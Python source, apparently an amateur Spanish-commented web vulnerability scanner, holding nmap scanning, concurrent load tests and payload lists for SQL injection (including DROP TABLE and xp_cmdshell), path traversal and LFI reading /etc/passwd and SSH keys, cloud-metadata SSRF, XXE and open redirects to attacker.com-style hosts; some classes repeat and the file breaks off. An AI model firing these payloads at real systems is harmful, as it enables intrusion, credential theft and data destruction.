
import aiohttp
from bs4 import BeautifulSoup
import json
import re
from multiprocessing import Pool, cpu_count
from functools import partial
import nmap
import flet as ft
import asyncio
import logging
import socket
import ssl
from datetime import datetime
import nmap
from urllib.parse import urlparse
from typing import Dict, Any, Tuple
from typing import Dict, List
import random
import string
import itertools
import requests
from typing import List
import time
import threading
from flet import Icons
import os
import subprocess

if os.name == "nt":
    _old_popen = subprocess.Popen

    def no_window_popen(*args, **kwargs):
        if "creationflags" not in kwargs:
            kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
        return _old_popen(*args, **kwargs)

    subprocess.Popen = no_window_popen
#-----------------------------------------------------------------------------------------------------------------------------------
# Configuración del logger
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

# Elimina los manejadores por defecto para evitar que los mensajes se registren en la consola
for handler in logger.handlers[:]:
    logger.removeHandler(handler)

# Crea un manejador de archivo
file_handler = logging.FileHandler('scanner.log', mode='w', encoding='utf-8')
file_handler.setLevel(logging.DEBUG)  # Establece el nivel de log para el archivo

# Define el formato de los mensajes de log
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(name)s - %(funcName)s - Line: %(lineno)d  - %(message)s')
file_handler.setFormatter(formatter)

# Añade el manejador al logger
logger.addHandler(file_handler)

class EscaneoPuertos:
    def __init__(self, url: str):
        self.url = urlparse(url).hostname
        self.scanner = nmap.PortScanner()

    async def escanear(self) -> Dict[int, Dict[str, str]]:
        """
        Escanea los puertos en la URL dada y devuelve los resultados.
        """
        dominio = self.url
        if not dominio:
            logger.error("No se pudo extraer el dominio de la URL ingresada.")
            return {}

        try:
            logger.info(f"Iniciando escaneo de puertos en {dominio}...")

            # Ejecutar Nmap en un hilo separado para no bloquear el programa
            await asyncio.to_thread(self.scanner.scan, dominio, arguments="-F -sV")
            
            logger.debug(f"Escaneo completado para {dominio}. Analizando resultados...")

            resultados = {}
            for host in self.scanner.all_hosts():
                logger.debug(f"Analizando host: {host}")
                for proto in self.scanner[host].all_protocols():
                    logger.debug(f"Protocolo encontrado: {proto}")
                    puertos = sorted(self.scanner[host][proto].keys())
                    for puerto in puertos:
                        estado = self.scanner[host][proto][puerto]['state']
                        servicio = self.scanner[host][proto][puerto].get('name', 'Desconocido')

                        # Registrar el estado de cada puerto (abierto o cerrado)
                        logger.info(f"Puerto: {puerto}, Estado: {estado}, Servicio: {servicio}")

                        # Si el puerto está abierto, lo agregamos a los resultados
                        if estado == "open":
                            resultados[puerto] = {"estado": estado, "servicio": servicio}
                        else:
                            logger.debug(f"Puerto {puerto} está cerrado.")

            if not resultados:
                logger.warning(f"No se encontraron puertos abiertos en {dominio}.")
            return resultados

        except Exception as e:
            logger.error(f"Error en escaneo con Nmap: {e}")
            return {}


class VerificacionCertificadoSSL:
    def __init__(self, url):
        self.url = url

    async def verificar(self) -> str:
        try:
            dominio = urlparse(self.url).hostname
            if not dominio:
                logger.error(f"No se pudo extraer el dominio de la URL: {self.url}")
                return "Error: No se pudo extraer el dominio de la URL."

            context = ssl.create_default_context()
            with socket.create_connection((dominio, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=dominio) as ssock:
                    certificado = ssock.getpeercert()
                    expiracion = certificado['notAfter']
                    
                    logger.info(f"Certificado SSL válido para {dominio} hasta {expiracion}")
                    return f"Certificado válido hasta: {expiracion}"
        except Exception as e:
            logger.error(f"Error al verificar el certificado SSL/TLS en {self.url}: {e}")
            return f"Error al verificar el certificado: {e}"

class VerificacionEncabezados:
    # Obtiene los encabezados HTTP de la respuesta del servidor.
    # Esto puede revelar información sensible o configuraciones inseguras.
    def __init__(self, url):
        self.url = url
        self.encabezados = {}

    async def verificar(self):
        try:
            logger.info(f"Iniciando verificación de encabezados en {self.url}")
            async with aiohttp.ClientSession() as session:
                async with session.get(self.url, timeout=5) as response:
                    self.encabezados = dict(response.headers)
                    logger.info(f"Encabezados obtenidos correctamente para {self.url}: {self.encabezados}")
        except Exception as e:
            self.encabezados = {"Error": str(e)}
            logger.error(f"Error al obtener los encabezados de {self.url}: {e}")

        return self.encabezados
    
class DeteccionSQLi:
    # Prueba payloads comunes para detectar vulnerabilidades de inyección SQL.
    def __init__(self, url):
        self.url = url
        
    async def detectar(self):
        logger.info(f"Iniciando detección de SQL Injection en {self.url}")
        payloads = [
            "' OR '1'='1' --", "' OR 1=1 --", "' AND 1=1 --",
            "'; DROP TABLE users --", "' UNION SELECT null, version() --",
            "' OR 'a'='a' --", "'; SELECT 1, user(), database() --",
            "'; EXEC xp_cmdshell('dir') --", "'; EXEC('DROP DATABASE test_db') --",
            "' UNION SELECT null, null, null, null --", "' AND 1=0 UNION SELECT null, null --",
            "' AND 1=0 HAVING 1=1 --", "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND IF(1=1, SLEEP(5), 0) --", "' AND IF(1=0, SLEEP(5), 0) --",
            "' OR IF(1=1, SLEEP(5), 0) --", "'; --", "' #", "'/* comentario */",
            "1' OR '1'='1' --", "1' OR 1=1 --", "1' AND 1=1 --",
            "'; EXEC sp_addsrvrolemember 'sa', 'sysadmin' --",
            "'; SELECT load_file('/etc/passwd') --",
            "'; SELECT table_name FROM information_schema.tables --",
            "User-Agent: ' OR 1=1 --", "Referer: ' OR 1=1 --", "X-Forwarded-For: ' OR 1=1 --",
        ]

        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    target_url = f"{self.url}?id={payload}"
                    async with session.get(target_url, ssl=False) as response:
                        content = await response.text()
                        if "error" in content.lower() or "sql" in content.lower():
                            logger.warning(f"Posible vulnerabilidad SQLi detectada con payload: {payload}")
                            return True
                except Exception as e:
                    logger.error(f"Error probando SQLi con payload {payload}: {e}")

        logger.info("No se detectaron vulnerabilidades SQLi en la URL analizada.")
        return False
class DeteccionCSRF:# verifica si los formularios tienen protección contra ataques CSRF mediante tokens. un atacante engaña 
                    #a un usuario autenticado para que realice acciones no deseadas en un sitio web donde está logueado, sin su consentimiento
    def __init__(self, url):
        self.url = url
        
    async def detectar(self):
        print("\nVerificando protecciones CSRF...")
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.url, ssl=False) as response:
                    soup = BeautifulSoup(await response.text(), 'html.parser')
                    forms = soup.find_all('form')
                    for form in forms:
                        if not form.find('input', {'name': 'csrf_token'}):
                            print("Formulario sin token CSRF detectado")
                            return True
            print("Tokens CSRF presentes en formularios")
            return False
        except Exception as e:
            print(f"Error verificando CSRF: {e}")
            return False 
class DeteccionDirectoryTraversal:# prueba payloads para acceder a archivos fuera del directorio raíz.
    def __init__(self, url):
        self.url = url
        
    async def detectar(self):
        print("\nProbando Directory Traversal...")
        payloads = [
            "../../../../etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
             "../../../../etc/passwd",               # Ruta clásica para acceder al archivo de contraseñas en sistemas Linux/Unix
            "%2e%2e%2fetc%2fpasswd",                 # Redirección codificada URL de la misma ruta anterior
            "..%2f..%2f..%2fetc%2fpasswd",           # Variación codificada, tratando de acceder a 'passwd'
             "..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log",  # Acceder a los logs de Apache
            "..%2f..%2f..%2f..%2fhome%2fuser%2fsecret.txt", # Intentar acceder a archivos sensibles de un usuario
            "..%2f..%2f..%2f..%2fvar%2flog%2fsecure",     # Acceder a logs de seguridad en un sistema Linux
            "..%2f..%2f..%2f..%2f%2fwindows%2fsystem32%2fconfig%2fsam", # Acceder a archivos del sistema en Windows
            "%2e%2e%2f..%2f..%2f..%2f..%2fetc%2fnginx%2fsites-available%2fdefault",  # Acceder a archivos de configuración de Nginx
            "..%2f..%2f..%2f..%2fvar%2flog%2ferror.log",  # Acceder a logs de errores de Apache
            "..%2f..%2f..%2f..%2f..%2fetc%2fhosts",       # Acceder al archivo /etc/hosts
            "..%2f..%2f..%2f..%2f%2fwindows%2fwin.ini",    # Acceder al archivo de configuración en Windows
            "..%2f..%2f..%2f..%2f..%2f%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts", # Acceder al archivo hosts en Windows
            "..%2f..%2f..%2f..%2fvar%2flog%2fnginx%2ferror.log",  # Logs de errores de Nginx
            "..%2f..%2f..%2f..%2f..%2fusr%2flocal%2fshare%2fconfig.json",  # Acceder a archivos de configuración JSON
            "..%2f..%2f..%2f..%2f%2froot%2fDocuments%2fconfidential.txt", # Acceder a documentos privados
            "..%2f..%2f..%2f..%2f..%2f%2fetc%2fpasswd",    # Intentar acceder a /etc/passwd
            "..%2f..%2f..%2f..%2f..%2f%2fetc%2fmysql%2fmy.cnf", # Acceder al archivo de configuración de MySQL
            "..%2f..%2f..%2f..%2f..%2f%2fhome%2fuser%2fimportant_data.txt", # Intento de acceder a datos sensibles de un usuario
            "..%2f..%2f..%2f..%2f..%2f%2fboot%2fgrub%2fgrub.conf"  # Acceder a archivos de configuración de GRUB (bootloader)
            ]
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    target_url = f"{self.url}?file={payload}"
                    async with session.get(target_url, ssl=False) as response:
                        content = await response.text()
                        if "root:" in content:
                            print(f"Vulnerabilidad Directory Traversal detectada con payload: {payload}")
                            return True
                except Exception as e:
                    continue
        print("No se detectó Directory Traversal")
        return False
    
class DeteccionLFI:
    # Busca vulnerabilidades que permitan incluir archivos locales del servidor.
    def __init__(self, url):
        self.url = url

    async def detectar(self):
        logger.info(f"Iniciando detección de Local File Inclusion (LFI) en {self.url}")

        payloads = [
            "file:///etc/passwd", "../../../../etc/passwd", "../../../../etc/hostname",
            "../../../etc/hosts", "../../../var/log/auth.log", "file:///var/www/html/index.php",
            "file:///var/www/html/admin/config.php", "file:///dev/sda1", "file:///dev/null",
            "file:///var/spool/mail/root", "file:///home/user/.ssh/id_rsa", "file:///usr/share/nginx/html/index.html",
            "file:///etc/apache2/sites-enabled/000-default.conf", "file:///proc/mounts",
            "file:///proc/cpuinfo", "file:///proc/net/tcp", "file:///C:/Windows/System32/drivers/etc/hosts",
            "file:///proc/self/status", "file:///var/run/docker.sock", "file:///var/www/.git/config",
            "file:///home/user/.ssh/id_rsa"
        ]

        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    target_url = f"{self.url}?page={payload}"
                    async with session.get(target_url, ssl=False) as response:
                        content = await response.text()
                        if "root:" in content:
                            logger.warning(f"Posible vulnerabilidad LFI detectada con payload: {payload}")
                            return True
                except Exception as e:
                    logger.error(f"Error probando LFI con payload {payload}: {e}")

        logger.info("No se detectaron vulnerabilidades LFI en la URL analizada.")
        return False
    
class DeteccionSSRF:
    # Prueba payloads para acceder a recursos internos del servidor (SSRF)
    def __init__(self, url):
        self.url = url

    async def detectar(self):
        logger.info(f"Iniciando detección de Server-Side Request Forgery (SSRF) en {self.url}")

        payloads = [
            "http://localhost", "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1", "http://0.0.0.0", "http://192.168.0.1",
            "http://172.16.0.1", "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/security-groups/", "http://127.0.0.1/admin",
            "http://localhost:3306", "http://127.0.0.1:5432", "http://192.168.1.50:6379",
            "http://localhost:22", "http://127.0.0.1:443", "http://localhost:8080",
            "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/",
            "http://169.254.169.254/latest/user-data/"
        ]

        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    target_url = f"{self.url}?url={payload}"
                    async with session.get(target_url, ssl=False) as response:
                        content = await response.text()

                        if "EC2" in content or "metadata" in content:
                            logger.warning(f"Posible vulnerabilidad SSRF detectada con payload: {payload}")
                            return True
                except Exception as e:
                    logger.error(f"Error probando SSRF con payload {payload}: {e}")

        logger.info("No se detectaron vulnerabilidades SSRF en la URL analizada.")
        return False

class DeteccionClickjacking:
    """
    Verifica si un sitio está protegido contra ataques de clickjacking mediante las cabeceras:
    - X-Frame-Options
    - Content-Security-Policy (CSP)
    - Intentos de carga dentro de <iframe>
    """
    def __init__(self, url):
        self.url = url

    async def detectar(self):
        logger.info(f"Iniciando prueba de Clickjacking en {self.url}")
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.url, ssl=False) as response:
                    headers = response.headers
                    
                    # Verifica si la cabecera X-Frame-Options está presente y es segura
                    x_frame_options = headers.get("X-Frame-Options", "").lower()
                    if not x_frame_options or x_frame_options not in ["deny", "sameorigin"]:
                        logger.warning(f"Posible Clickjacking: Falta X-Frame-Options segura en {self.url}")

                    # Verifica si Content-Security-Policy (CSP) bloquea iframes
                    content_security_policy = headers.get("Content-Security-Policy", "").lower()
                    if "frame-ancestors" not in content_security_policy:
                        logger.warning(f"Posible Clickjacking: Falta 'frame-ancestors' en CSP de {self.url}")
                    
                    # Simula carga en iframe (Prueba manual recomendada)
                    iframe_test = f"""
                    <html>
                        <body>
                            <iframe src="{self.url}" width="500" height="500"></iframe>
                        </body>
                    </html>
                    """
                    logger.info(f"Para verificar manualmente, intenta cargar este código en un navegador:\n{iframe_test}")

                    # Si no hay protecciones, se considera vulnerable
                    if not x_frame_options and "frame-ancestors" not in content_security_policy:
                        logger.warning(f"Clickjacking posible en {self.url}")
                        return True

            logger.info(f"Protección contra Clickjacking presente en {self.url}")
            return False
        except Exception as e:
            logger.error(f"Error verificando Clickjacking en {self.url}: {e}")
            return False

class DeteccionOpenRedirect:
    """
    Prueba si el sitio redirige a URLs externas sin validación.
    Se usan múltiples payloads para evaluar la vulnerabilidad.
    """
    def __init__(self, url):
        self.url = url

    async def detectar(self):
        logger.info(f" Iniciando prueba de Open Redirect en {self.url}")

        payloads = [
            "https://www.ejemplo-malicioso.com",
            "javascript:alert('Redirected')",                 # Uso de JavaScript en el parámetro de redirección
            "http://evil.com",                                # URL con protocolo HTTP
            "https://evil.com",                               # URL con protocolo HTTPS
            "ftp://evil.com",                                 # Usar un protocolo diferente (FTP)
            "data:text/html,<script>alert('Hacked!')</script>", # Redirección con un script en el payload
            "http://127.0.0.1",                              # Redirección a una dirección local (localhost)
            "http://localhost",                               # Redirección al dominio localhost
            "//evil.com",                                     # Redirección sin especificar el protocolo (puede ser HTTP o HTTPS)
            "https://www.ejemplo-malicioso.com/evil?cookie=" + "document.cookie",  # Redirección con intento de robar cookies
            "http://attacker.com#redirect=https://www.victim.com",  # Redirección a través de un fragmento en la URL
            "http://attacker.com?redirect=https://victim.com",      # Redirección con parámetros adicionales
            "https://www.example.com/?redirect=https://attacker.com", # Redirección a un sitio malicioso con una URL válida en los parámetros
            "https://attacker.com?redirect_to=https://www.victim.com", # Variación del parámetro de redirección
            "http://evil.com#attack",                        # Redirección con anclaje al final de la URL
            "https://evil.com/?redirect=javascript:alert('hacked')"  # Redirección a un script malicioso
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    target_url = f"{self.url}?redirect={payload}"
                    async with session.get(target_url, ssl=False, allow_redirects=False) as response:
                        location_header = response.headers.get('Location', '')

                        if response.status in (301, 302) and payload in location_header:
                            logger.warning(f"Vulnerabilidad Open Redirect detectada en {target_url}")
                            return True

            logger.info(f"No se detectó Open Redirect en {self.url}")
            return False

        except Exception as e:
            logger.error(f"Error probando Open Redirect en {self.url}: {e}")
            return False
        
class DeteccionLFI:
    #Busca vulnerabilidades que permitan incluir archivos locales del servidor.
    #La vulnerabilidad LFI ocurre cuando una aplicación web permite a un atacante 
    #incluir archivos locales en el servidor, exponiendo información sensible o permitiendo ejecución remota.
    
    def __init__(self, url):
        self.url = url

    async def detectar(self):
        logger.info(f"Iniciando prueba de LFI en {self.url}")

        payloads = [
            "file:///etc/passwd",
            "../../../../etc/passwd",   # Accede al archivo de contraseñas en Linux
            "../../../../etc/hostname", # Accede al nombre del host
            "../../../etc/hosts",       # Accede al archivo de configuración de red
            "../../../var/log/auth.log",# Logs de autenticación
            "file:///var/www/html/index.php",
            "file:///var/www/html/admin/config.php",
            "file:///dev/sda1",         # Accede al dispositivo de almacenamiento
            "file:///var/spool/mail/root",
            "file:///home/user/.ssh/id_rsa", # Claves privadas SSH
            "file:///usr/share/nginx/html/index.html",
            "file:///etc/apache2/sites-enabled/000-default.conf",
            "file:///proc/mounts",     # Sistemas de archivos montados
            "file:///proc/cpuinfo",    # Información sobre la CPU
            "file:///proc/net/tcp",    # Conexiones de red activas
            "file:///C:/Windows/System32/drivers/etc/hosts", # Hosts en Windows
            "file:///proc/self/status", 
            "file:///var/run/docker.sock",
            "file:///var/www/.git/config"
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    target_url = f"{self.url}?page={payload}"
                    async with session.get(target_url, ssl=False) as response:
                        content = await response.text()

                        # Comprobación de patrones en archivos comunes vulnerables
                        if "root:" in content or "127.0.0.1" in content or "password" in content:
                            logger.warning(f"Vulnerabilidad LFI detectada con payload: {payload} en {self.url}")
                            return True

            logger.info(f"No se detectó LFI en {self.url}")
            return False

        except Exception as e:
            logger.error(f"Error probando LFI en {self.url}: {e}")
            return False
class DeteccionSSRF:
    #Prueba si un sitio es vulnerable a Server-Side Request Forgery (SSRF).
    #Un ataque SSRF permite a un atacante hacer que el servidor realice solicitudes no autorizadas a recursos internos.
    
    def __init__(self, url):
        self.url = url

    async def detectar(self):
        logger.info(f"Iniciando prueba de SSRF en {self.url}")

        payloads = [
            "http://localhost",
            "http://127.0.0.1",  # Dirección local del servidor
            "http://0.0.0.0",    # Dirección de loopback
            "http://192.168.0.1",  # Dirección IP de red local
            "http://172.16.0.1",   # Dirección IP privada
            "http://169.254.169.254/latest/meta-data/",  # AWS EC2 metadata
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/security-groups/",
            "http://127.0.0.1/admin",  # Panel de administración en localhost
            "http://localhost:3306",  # Puerto MySQL
            "http://127.0.0.1:5432",  # Puerto PostgreSQL
            "http://192.168.1.50:6379",  # Puerto Redis
            "http://localhost:22",  # SSH (Puerto 22)
            "http://127.0.0.1:443",  # HTTPS en localhost
            "http://169.254.169.254/latest/user-data/",  # Datos del usuario EC2
            "http://metadata.google.internal/computeMetadata/v1/",  # Metadata Google Cloud
            "http://192.168.1.1/cgi-bin/status",  # Posible panel de administración de routers
            "http://internal-service.local",  # Dominio interno ficticio
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    try:
                        target_url = f"{self.url}?url={payload}"
                        async with session.get(target_url, ssl=False) as response:
                            content = await response.text()

                            # Comprobación de patrones que indican acceso no autorizado
                            if any(keyword in content.lower() for keyword in ["ec2", "metadata", "iam", "root", "server", "config"]):
                                logger.warning(f"Vulnerabilidad SSRF detectada con payload: {payload} en {self.url}")
                                return True
                    except Exception as e:
                        logger.error(f"Error probando SSRF con payload {payload}: {e}")
                        continue

            logger.info(f"No se detectó SSRF en {self.url}")
            return False

        except Exception as e:
            logger.error(f"Error general en la prueba de SSRF: {e}")
            return False

class DeteccionOpenRedirect:
    def __init__(self, url):
        self.url = url
        
    async def detectar(self):
        logger.info("Probando Open Redirect...")
        payloads = ["https://evil.com", "javascript:alert('Redirected')", "http://127.0.0.1"]
        try:
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    target_url = f"{self.url}?redirect={payload}"
                    async with session.get(target_url, ssl=False, allow_redirects=False) as response:
                        if response.status in (301, 302) and payload in str(response.headers.get('Location', '')):
                            logger.warning("Vulnerabilidad Open Redirect detectada")
                            return True
            logger.info("No se detectó Open Redirect")
            return False
        except Exception as e:
            logger.error(f"Error probando Open Redirect: {e}")
            return False

class DeteccionXXE:
    def __init__(self, url):
        self.url = url
        
    async def detectar(self):
        logger.info("Probando XML External Entity...")
        xml_payloads = ["""<?xml version="1.0"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data>&xxe;</data>"""]
        async with aiohttp.ClientSession() as session:
            headers = {'Content-Type': 'application/xml'}
            for i, xml_payload in enumerate(xml_payloads):
                try:
                    async with session.post(self.url, data=xml_payload.encode('utf-8'), headers=headers, ssl=False) as response:
                        content = await response.text()
                        if "root:" in content:
                            logger.warning(f"Vulnerabilidad XXE detectada con payload {i+1}")
                            return True
                except Exception as e:
                    logger.error(f"Error probando XXE: {e}")
        return False

class DeteccionSubdomainTakeover:
    def __init__(self, url):
        self.url = url
        
    async def detectar(self):
        logger.info("Verificando posibles Subdomain Takeovers...")
        subdomains = ["dev", "staging", "test"]
        parsed = urlparse(self.url)
        base_domain = parsed.hostname
        async with aiohttp.ClientSession() as session:
            for sub in subdomains:
                target = f"http://{sub}.{base_domain}"
                try:
                    async with session.get(target, ssl=False) as response:
                        if response.status == 404:
                            logger.warning(f"Subdominio potencialmente vulnerable: {sub}.{base_domain}")
                            return True
                except Exception as e:
                    logger.error(f"Error verificando subdominio {sub}: {e}")
        return False

class DeteccionDeserializacionInsegura:
    def __init__(self, url):
        self.url = url
        
    async def detectar(self):
        logger.info("Probando Deserialización Insegura...")
        payload = {"__class__": "EjemploInseguro", "data": {"key": "valor"}}
        try:
            async with aiohttp.ClientSession() as session:
                headers = {'Content-Type': 'application/json'}
                async with session.post(self.url, data=json.dumps(payload), headers=headers, ssl=False) as response:
                    if response.status == 500:
                        logger.warning("Vulnerabilidad de deserialización detectada")
                        return True
            logger.info("No se detectó deserialización insegura")
            return False
        except Exception as e:
            logger.error(f"Error probando deserialización: {e}")
            return False

class DeteccionXSS:
    def __init__(self, url):
        self.url = url

    async def buscar(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.url, ssl=False) as response:
                    if response.status != 200:
                        logger.error(f"Error: Respuesta HTTP {response.status}")
                        return f"Error HTTP {response.status}"
                    html = await response.text()
                    soup = BeautifulSoup(html, "html.parser")
                    scripts = soup.find_all("script")
                    if scripts:
                        logger.warning("Posible vulnerabilidad XSS detectada.")
                        return "Posible vulnerabilidad XSS detectada."
                    logger.info("No se detectaron scripts inseguros.")
                    return "No se detectaron scripts inseguros."
        except aiohttp.ClientError as e:
            logger.error(f"Error de conexión con {self.url}: {e}")
            return "Error de conexión"
        except Exception as e:
            logger.error(f"Error inesperado: {e}")
            return "Error inesperado"


class CondicionesDeCarrera:
    #Clase para detectar y simular condiciones de carrera en el servidor,
    #donde múltiples solicitudes concurrentes pueden generar resultados inesperados,
    #como la duplicación de transacciones o la omisión de validaciones.
    
    def __init__(self, url: str, num_solicitudes: int):
        self.url = url  # Dirección del servidor a probar
        self.num_solicitudes = num_solicitudes  # Cantidad de solicitudes a enviar

    async def ejecutar(self) -> dict:
    
       # Ejecuta la prueba de condiciones de carrera enviando solicitudes concurrentes
        #al servidor para verificar si hay vulnerabilidad.
    
        resultados = {"exitosas": 0, "errores": 0}  # Contador de solicitudes exitosas y fallidas

        async with aiohttp.ClientSession() as session:
            async def enviar_solicitud(numero: int):
                """ Intenta realizar una solicitud HTTP a la URL, generando condiciones de carrera """
                try:
                    # Generamos una pequeña variación aleatoria para simular un comportamiento irregular
                    delay = random.uniform(0, 0.5)  # Retraso aleatorio para las solicitudes
                    await asyncio.sleep(delay)

                    # Enviamos una solicitud de tipo GET
                    async with session.get(self.url, ssl=False) as response:
                        if response.status == 200:
                            resultados["exitosas"] += 1  # Si tiene éxito, aumenta el contador de exitosas
                            logger.info(f"Solicitud #{numero} exitosa: {response.status}")
                        else:
                            resultados["errores"] += 1
                            logger.warning(f"Solicitud #{numero} fallida con estado: {response.status}")
                except Exception as e:
                    resultados["errores"] += 1
                    logger.error(f"Solicitud #{numero} fallida. Error: {e}")

            logger.info(f"Iniciando prueba de condiciones de carrera con {self.num_solicitudes} solicitudes...")

            # Lanza múltiples solicitudes simultáneamente y espera que todas terminen
            await asyncio.gather(*(enviar_solicitud(i + 1) for i in range(self.num_solicitudes)))

        logger.info("Prueba de condiciones de carrera completada.")
        return resultados



class PruebaCarga:
    def __init__(self, url, num_solicitudes2):
        self.url = url  # Dirección del servidor a probar
        self.num_solicitudes2 = num_solicitudes2  # Cantidad de solicitudes a enviar

    async def ejecutar(self):
        resultados = {"exitosas": 0, "errores": 0}  # Contador de solicitudes exitosas y fallidas

        async def enviar_solicitud(numero):
            """ Intenta realizar una solicitud HTTP a la URL """
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(self.url, ssl=False) as response:
                        resultados["exitosas"] += 1  # Si tiene éxito, aumenta el contador de exitosas
                        logger.info(f"Solicitud #{numero} exitosa: {response.status}")
            except Exception as e:
                resultados["errores"] += 1
                logger.error(f"Solicitud #{numero} fallida. Error: {e}")

        logger.info(f"Iniciando prueba de carga con {self.num_solicitudes2} solicitudes...")

        # Lanza múltiples solicitudes simultáneamente y espera que todas terminen
        await asyncio.gather(*(enviar_solicitud(i + 1) for i in range(self.num_solicitudes2)))

        logger.info("Prueba de carga completada.")
        return resultados
    

def generate_cyclic_pattern(length: int) -> str:

  #  Genera un patrón cíclico de longitud 'length', compuesto por letras y dígitos.
   # Este patrón se utiliza para identificar offsets en entornos vulnerables.
    
    pattern = ""
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    charset_length = len(charset)
    for i in range(length):
        pattern += charset[i % charset_length]
    return pattern

class BufferOverflowDetector:
    #Aprovecha vulnerabilidades en el manejo de memoria de una aplicación, lo que puede permitir la ejecución de código malicioso.
    #Clase para analizar la robustez de una página web mediante su URL.
    #Envía un payload excesivamente largo (generado con un patrón cíclico) para
    #evaluar hasta qué punto la aplicación puede manejar la entrada.
    #Si el servidor responde con un error (por ejemplo, HTTP 500), podría
    #indicar una vulnerabilidad de desbordamiento de búfer.
    
    def __init__(self, url, payload_length):
        # Almacena la URL objetivo y la longitud del payload
        self.url = url
        self.payload_length = payload_length

    async def detectar(self):
        # Registra el inicio de la prueba en el log
        logger.info(f"Iniciando prueba de Buffer Overflow en {self.url}")
        
        # Genera el payload con la longitud especificada
        payload = generate_cyclic_pattern(self.payload_length)
        # Prepara los datos para enviar en la solicitud
        data = {"input": payload}
        
        try:
            # Crea una sesión HTTP asíncrona
            async with aiohttp.ClientSession() as session:
                # Define los encabezados para la solicitud
                headers = {'Content-Type': 'application/json'}
                # Registra detalles de la solicitud que se va a enviar
                logger.debug(f"Enviando solicitud POST a {self.url} con encabezados {headers} y datos {data}")
                # Envía la solicitud POST al servidor
                async with session.post(self.url, json=data, headers=headers, ssl=False) as response:
                    # Obtiene el texto de la respuesta
                    response_text = await response.text()
                    # Registra la respuesta del servidor
                    logger.debug(f"Respuesta del servidor: {response.status} - {response_text}")
                    
                    # Si el servidor retorna un error 500, podría indicar que no puede manejar la entrada
                    if response.status == 500:
                        logger.warning("Posible vulnerabilidad de Buffer Overflow detectada.")
                        return True
            # Si no se detectó error 500, registra que no se encontró vulnerabilidad
            logger.info("No se detectó Buffer Overflow en el servidor.")
            return False
        except Exception as e:
            # Registra cualquier error que ocurra durante la prueba
            logger.error(f"Error al probar Buffer Overflow: {e}")
            return False

class HostHeaderInjectionScanner:
    def __init__(self, url: str):
        
        #Inicializa el escáner con la URL y genera automáticamente los encabezados 'Host' para las pruebas.
        
        #param url: URL de la página que deseas analizar.
        
        self.url = url  # URL de la página que deseas analizar
        self.headers = self.generar_encabezados(url)  # Generar encabezados automáticamente
        logger.info(f"Inicializando el escáner con URL: {url}")

    def generar_encabezados(self, url: str) -> List[str]:
        """Genera una lista de encabezados 'Host' basados en la URL proporcionada"""
        parsed_url = urlparse(url)
        domain = parsed_url.hostname
        
        # Variaciones comunes de encabezados que podrían ser probadas
        encabezados = [
            domain,  # dominio principal
            f"www.{domain}",  # subdominio www
            f"vulnerable.{domain}",  # subdominio para prueba
            "localhost",  # prueba de localhost
            "attacker.com",  # dominio potencialmente malicioso
            "exploit.com",  # otro dominio malicioso
        ]
        return encabezados

    async def enviar_solicitud(self, session: aiohttp.ClientSession, url: str, headers: dict) -> Tuple[str, int]:
        """Envía una solicitud HTTP con el encabezado 'Host' modificado y obtiene la respuesta de manera asíncrona"""
        try:
            logger.info(f"Enviando solicitud con encabezado 'Host': {headers['Host']}")
            async with session.get(url, headers=headers) as response:
                body = await response.text()
                logger.info(f"Respuesta obtenida con estado: {response.status}")
                return body, response.status
        except Exception as e:
            logger.error(f"Error al enviar solicitud: {str(e)}")
            return "", 500

    async def verificar_host_header_injection(self) -> Tuple[str, str]:
        """Verifica si hay vulnerabilidad de Host Header Injection al modificar el encabezado 'Host'"""
        logger.info("Iniciando verificación de Host Header Injection...")
        resultados = []

        async with aiohttp.ClientSession() as session:
            # Crear una lista de tareas para enviar solicitudes de manera concurrente
            tasks = []
            for host in self.headers:
                headers_modificado = {'Host': host}
                tasks.append(self.enviar_solicitud(session, self.url, headers_modificado))

            # Esperar a que todas las tareas se completen
            responses = await asyncio.gather(*tasks)

            for body, status in responses:
                # Procesar las respuestas
                if status == 200:
                    logger.info(f"Verificando vulnerabilidad para el Host: {host}")
                    if "some indicator of vulnerability" in body:  # Personaliza esta condición según tu análisis
                        resultado = f"Posible vulnerabilidad con el Host: {host}"
                        resultados.append(resultado)
                        logger.warning(resultado)
                    else:
                        logger.info(f"El Host {host} no parece vulnerable.")
                else:
                    resultado = f"Error con Host {host}, Status: {status}"
                    resultados.append(resultado)
                    logger.error(resultado)

        if not resultados:
            return "Verificación de Host Header Injection", "No se detectaron vulnerabilidades."

        resultado_formateado = "\n".join(resultados)
        return "Verificación de Host Header Injection", resultado_formateado

class VerificadorCacheoInseguro: 
    def __init__(self, url: str):
        self.url = url
        self.recomendaciones = []
        logger.info(f"Verificador de cacheo inseguro iniciado para la URL: {url}")

    def verificar_cacheo_inseguro(self) -> str:
        # ocurre cuando un navegador o un servidor almacena contenido HTTP sin las medidas de seguridad adecuadas, lo que puede exponer información 
        # sensible o permitir ataques como la manipulación de respuestas almacenadas
